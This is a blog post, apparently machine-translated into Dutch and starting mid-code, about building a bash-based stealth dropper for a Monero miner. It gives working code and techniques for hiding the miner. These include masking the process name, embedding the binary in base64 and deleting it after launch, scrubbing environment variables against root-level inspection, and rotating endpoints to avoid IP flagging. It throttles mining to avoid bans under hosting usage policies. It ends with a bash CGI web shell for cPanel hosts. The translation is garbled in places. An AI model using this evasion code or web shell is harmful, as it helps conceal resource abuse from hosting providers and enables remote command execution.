        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>We schrijven een daemon, wat een langdurig proces is, en we gebruiken veel bestandsdescriptors, we willen echt wat opschonen om te voorkomen dat we in<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> limieten</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Deze functie is afhankelijk van:<a href=https://ipinfo.io/> ipinfo</a> om de regio van de werknemer te bepalen, wat het mogelijk maakt om enige regioafhankelijke logica af te stemmen,<a href=\assets/posts/geoip.json> geoip.json</a> groepeert landen in regio's, omdat we de regio op het hoogste niveau willen en niet geïnteresseerd zijn in het specifieke land.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash heeft ondersteuning voor tcp-verbindingen, door een abstractie over te hebben<code>/dev/tcp</code> (ook voor udp, maar de meeste lijken meestal uitgeschakeld te zijn tijdens het bouwen, dus je kunt er niet op vertrouwen). Deze bestanden zijn een bash-ding, ze maken geen deel uit van de linux<code>/dev</code> boom.<p>Vermeldenswaard is ook een vergrendelingssysteem om gelijktijdigheid tussen bash-taken af ​​​​te handelen. Om meerdere taken met sloten te laten werken, moeten ze allemaal een bestandsdescriptor delen, dus onze<code>locker</code> wat ook een baan is, moet worden gestart voordat andere banen die het slot willen gebruiken. Het kluisje leest gewoon verder<code>stdin</code> wachten op vergrendelingsverzoeken, reageren op<code>stdout</code> afhankelijk van de huidige booleaanse status die is opgeslagen in een variabele. Ik kan niet garanderen dat deze aanpak racevrij is, maar het lijkt behoorlijk te werken, aan de andere kant heb ik gemerkt dat bestandsdescriptors niet erg betrouwbaar zijn, omdat ik vermoed dat er enkele buffers zijn die niet ergens in de<em> pijpen</em> en uiteindelijk impasses raken (wat betekent dat je er niet op kunt vertrouwen dat de locker je altijd antwoord geeft).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Ruim je rommel op... complexe bash-programma's gebruiken uiteindelijk veel variabelen, en als je de globale ruimte misbruikt, wordt het opgeblazen. Als je shell-jobs spawnt, erven ze de hele omgeving (die effectief wordt gedupliceerd, niet gedeeld), je kunt snel eindigen met bash-eten<code>100M</code> van het geheugen, niet leuk. Ook willen we echt low profile zijn. In ons implementatiescenario is de tegenstander<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> kan mogelijk root-toegang hebben en volledige informatie over onze processen hebben<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , en je weet... elk proces bevat informatie over de volledige opdracht waarmee het is gestart, en de geëxporteerde omgevingsvariabelen.<h2 id=configuration><a class=header-anchor href=#configuration> Configuratie</a></h2><p>Zodra we onze omgeving en onze tools hebben, moeten we onze miner afstemmen op de machine waarop deze draait, configuratiestappen in pseudo-code:<ul><li><p>procesnaam voor de mijnwerker<li><p>hostinfo (ram/cores/caches/<code>ENV_VARS</code>)<li><p>configuratie versie<li><p><code>worker_id</code> voor de miner (van ip en host)<li><p>ip/poort voor de verbinding</ul><p>Het kiezen van een naam voor het proces is vereist om:<em> verbergen</em> het feit dat we een mijnwerker runnen, maar we hernoemen niet alleen ons binaire bestand, we hebben een lijst met<strong> maskers</strong> voor potentiële kandidaten (een tekstbestand zonder opmaak waarbij elke regel een masker is):<ul><li><p>kies willekeurig een masker<li><p>schud de elementen van de staart van de string (allemaal behalve de eerste) om een ​​divers procescommando te krijgen. Nu hebben we een string die eruitziet als<code>cmd --arg2 --arg1 --arg3</code> . Dit is ons mijnwerkersmasker, we voeren het binaire bestand uit<em> zonder</em> argumenten, maar het lijkt erop dat we een opdracht hebben gestart<code>cmd</code> met argumenten<code>--arg1 --arg2 --arg3</code> . Spaties en streepjes zijn toegestaan ​​in bestandsnamen, dus het is prima om een ​​binair bestand met deze naam uit te voeren, het lijkt erop dat Linux geen onderscheid maakt tussen het uitvoerbare bestand en de argumenten bij het opslaan van de procesopdrachten.<p>De mijnwerkerconfiguratie wordt automatisch geladen van<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> hashrate</a></h3><p>, met de tijd, kreeg de stroomopwaartse mijnwerker veel<strong> automatisch afstemmen</strong> functies, dus het maakte een deel van mijn scripts overbodig, maar het verschil tussen stroomopwaarts en stroomafwaarts hier is dat het stroomopwaartse doel is om te maximaliseren<em> uitvoering</em> , terwijl ons doel is om te maximaliseren<em> efficiëntie en verduistering</em> , we willen het systeem niet inhalen, we willen een beetje achteroverleunen zonder onderbreking van de dienstverlening.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Hiervoor hebben we een meer gedetailleerd begrip van de omgeving nodig, de<code>l2/l3</code> cachestructuur van de processor, ram en cores, en huidige processor<em> gemiddeld</em> laden en cpu<em> gebruik</em>. Ik heb geprobeerd een te bouwen<a href=https://en.wikipedia.org/wiki/Finite-state_machine> staatsmachine</a> in bash die zou beginnen met het absolute minimum en verschillende configuraties zou proberen die langzaam op de gemiddelde beste zouden uitkomen. Het was een<strong> enorm</strong> verspilling van moeite bezaaid met<a href=https://en.wikipedia.org/wiki/Technical_debt> technische schuld</a> dat ging heel snel failliet en werd grotendeels weggegooid, met alleen overblijfselen die in de codebase bleven hangen.<p>Frack al deze auto-tuning jumbo, we hebben de mijnwerker zojuist laten slapen, afhankelijk van het gebruik / de belasting van de host, dit vereiste mijnwerkeraanpassingen om<code>sleep</code> resultaten tussen threads, en een paar oplossingen voor de configuratiewaakhond<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , waarmee we de slaaphoeveelheid tijdens runtime kunnen herladen. De logica is veel eenvoudiger en ziet er als volgt uit:<ul><li><p>als het gebruik hoger of lager is dan $TARGET_USAGE (± foutmarge) slaap verhogen/verlagen<li><p>als gemiddelde belasting binnen<code>1m</code> is boven/onder $TARGET_LOAD mijnbouw pauzeren/hervatten</ul><h3 id=connection><a class=header-anchor href=#connection> Verbinding</a></h3><p>In onze bash-verzameling lieten we hulpprogramma's voor verbinding zien. Waarom hebben we deze nodig? Omdat we diversiteit nodig hebben; het simpelweg hard coderen van een eindpunt in de configuratie duurt niet lang, als iets er verdacht uitziet en netwerkactiviteit heeft, worden IP's gemarkeerd.<p>In het begin hebben we geëxperimenteerd met een aantal methoden:<ul><li><p>gebruik makend van<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxyketens</a> om de mijnwerkersnetwerkoproepen te overbelasten, maar het vereiste dat de mijnwerker werd gebouwd met dynamische bibliotheken, en je moest ze met de payload verzenden, dus het was onpraktisch.<li><p>rennend<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> voorwaartse tunnel</a> zij aan zij met de mijnwerker: dit had veel configuratie-overhead, omdat we nu twee processen voor elke implementatie aan het configureren waren, wat neerkwam op meer bugs.</ul><p>Uiteindelijk besloten we om gewoon een lijst met eindpunten te verzenden, opgeslagen in een bash-variabelen, en er willekeurig een te kiezen. De verbindingen waren uiteraard versleuteld. Wat zijn deze eindpunten? Doorstuurservers naar de proxy die de mijnwerkerstaken zou afhandelen.<p>Waarom hebben we een<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> mijnbouwproxy</a> ? Ik ben nooit echt voorbij ~ 100 gelijktijdige verbindingen gegaan, dus een proxy was niet echt nodig voor netwerkbelasting, maar het was handig om te onderhandelen over het hash-algoritme en om verschillende moeilijkheidsdoelen aan verschillende miners te bieden, om te voorkomen dat miners eraan werken<strong> moeilijkheid</strong> doelstellingen die hen te veel tijd zouden kosten om te voltooien en het risico van verspilling van rekenkracht aan onvoltooide taken te vermijden.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> De poolsoftware vereiste ook een paar aanpassingen omdat het graag adverteerde om een ​​proxy te zijn op gewone http-verzoeken...<em> dat moest een time-out zijn</em> , en een vork voegde toegangscontrole toe, dus daar hebben we onze mods op gebaseerd.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> json bewerken</a></h3><p>Door aanpassingen aan een json-bestand toe te passen met alleen bash, zijn we geslaagd met wat env var-vervanging en wat regex. Aanvankelijk vertrouwden we op een<code>envsubst</code> binair om variabelen toe te passen, toen gingen we vol bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> met deze logica:<ul><li><p>configuratiesjabloon lezen<li><p>vervang alle aanhalingstekens door een zeer esoterische string (zoals<code>_#_#</code>)<li><p><code>eval</code> de sjabloon<li><p>vervang alle esoterische gebeurtenissen terug met aanhalingstekens</ul><p>Afgezien van het vermijden van subprocessen, is een ander voordeel dat we volledige bash-mogelijkheden in onze sjablonen krijgen. Voor lezen en schrijven zonder sjablonen moeten we vertrouwen op bash regex-mogelijkheden:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Dit stelt ons alleen in staat om enkele regels te bewerken, voor invoer met meerdere regels wordt alleen de eerste regel in overweging genomen.. maar het is goed genoeg voor ons gebruik.<h2 id=runtime><a class=header-anchor href=#runtime> Runtime</a></h2><p>Hoe ziet onze looptijd eruit? We hebben een main bash-proces dat de hoofdlus uitvoert, vervolgens het miner-subproces, het cpu-monitor-subproces, de locker en de tuner. Dat is bijna een handvol.<p>Ten eerste willen we ervoor zorgen dat als er iets misgaat, we geen rommel achterlaten, dit betekent dat we een bash trap gebruiken om op te ruimen bij beëindiging<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> zet de val uit om recursie te voorkomen. De val doodt alle banen en verwijdert de werkomgeving.<p>Het is tijd om de mijnwerker te starten, die is opgeslagen als een bash-variabele in base64-codering. We dumpen het op het bestandssysteem, dan dumpen we de configuratie, voeren de mijnwerker uit en verwijderen zowel de mijnwerker als de configuratie. Op linux kun je het uitvoerbare bestand van een lopend proces verwijderen (op Windows is dit niet toegestaan).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Als de miner actief is, is er op het bestandssysteem slechts een<code>.. /</code> map met a<code>b64</code> koppeling erin.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Een gekmakende gril die je tegenkomt met bash tijdens het coderen van de mijnwerker is dat het toewijzen van een variabele met een subshell met aanhalingstekens<code>myvar="$(something)"</code> veroorzaakt een permanente toename van het geheugengebruik, dit was moeilijk te debuggen en heb niet echt de reden gevonden waarom het zich zo gedraagt, hoe dan ook, de opdracht moet niet worden aangehaald. In plaats daarvan wordt decoderen gedaan met<em> ketterij</em> wat een abstractie is van tijdelijke bestanden, wordt de variabele in een bestand gedumpt dat vervolgens weer in het proces wordt teruggevoerd.<p>De langlopende lus van de mijnwerker:<ul><li><p>terwijl het waar is<ul><li><p>stop mijnwerker<li><p>verwijder configuratie<li><p>start mijnwerker<li><p>terwijl het waar is<ul><li><p>start daemon<ul><li><p>terwijl de mijnwerker draait<ul><li><p>lees de output van miner<li><p>kies mijnwerkersactie op basis van uitvoerlijn</ul></ul><li><p>als mijnwerker niet actief is: pauze</ul><li><p>slaap</ul></ul><p>De uitvoerregel wordt vergeleken met een regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>De daemon behandelt gevallen waarin:<ul><li><p>de verbinding met het eindpunt geeft fouten (kies een nieuw willekeurig eindpunt)<li><p>het hash-algoritme verandert (pas slaaptijd en ad-hocconfiguraties aan)<li><p>miner problemen (start de miner opnieuw).</ul><p>Een tijdje was er ondersteuning voor het command-and-control-dashboard, dat handmatige herstart mogelijk maakte, maar omdat het gebruik ervan minimaal was, werd het weggegooid en werden de eindpunten vervangen door een alternatieve poolverbinding, ook was het herstartproces onstabiel, complex. ..een ander voorbeeld van technische schulden. Het maakte het echter mogelijk om een ​​bijgewerkte payload opnieuw op te halen en alle configuraties on-the-fly opnieuw in te stellen, wat best cool was, de ultieme trampoline.<h2 id=debugging><a class=header-anchor href=#debugging> Debuggen</a></h2><p>Er zijn drie hoofdhulpprogramma's:<ul><li><p>schakel tracering rond codeblokken in/uit (we willen een b64-gecodeerd binair bestand niet traceren in een variabele..)<li><p>een eenvoudige functie voor het opmaken van logs<li><p>een vlag die uitgebreide logboekregistratie tijdens runtime zou activeren wanneer de mijnwerker werd gestart.<ul><li><p>doet het bestand<code>.debug</code> bestaan?<ul><li><p>uitgebreide logboekregistratie inschakelen</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Doelimplementaties</a></h2><p>Deze opstelling is getest op 3 soorten hosts:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Zelf gehoste containers of VM's</a></h3><p>Veel hostingproviders houden niet van mining, omdat CPU-bronnen vaak door meerdere gebruikers worden gedeeld, en mining-software een hostnode gemakkelijk kan vertragen, wat van invloed is op de prestaties voor de rest van de gebruikers. Dit kan zelfs waar zijn als de gebruikerstijd van de CPU onbeperkt is, omdat hashing-algoritmen alle cachelagen van de CPU kunnen verzadigen als de cache wordt gedeeld door alle CPU-kernen.<p>We willen graag onze<em> kermis</em> delen van bronnen zonder verbannen te worden, dat is een goede use-case voor onze stealth-dropper, omdat deze zich bewust is van het hostgebruik, wat betekent dat het<em> zou moeten</em> blijf een beetje binnen [AUP]. Er zijn geen extra stappen bij het omgaan met door uzelf gehoste implementaties, alleen het opstartscript, mogelijk toegevoegd aan de opstartvolgorde of handmatig gestart.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> cPanel gebaseerde webhosting</a></h3><p>Abonnementen voor webhosting worden meestal aangeboden via [cPanel]. Ook hier gebruiken we persoonlijke abonnementen die redelijke limieten hebben, aan de andere kant heeft elk gratis abonnement belachelijke limieten<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel stelt u in staat om handlers voor verschillende bestandsextensies te definiëren, dit stelt ons in staat om shellscripts uit te voeren via de<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> met een http-verzoek tegen een shellscript dat op de server is geüpload. Dit soort interfaces zijn hoe web-shells eruit zien<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Een eenvoudige bash-webshell<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
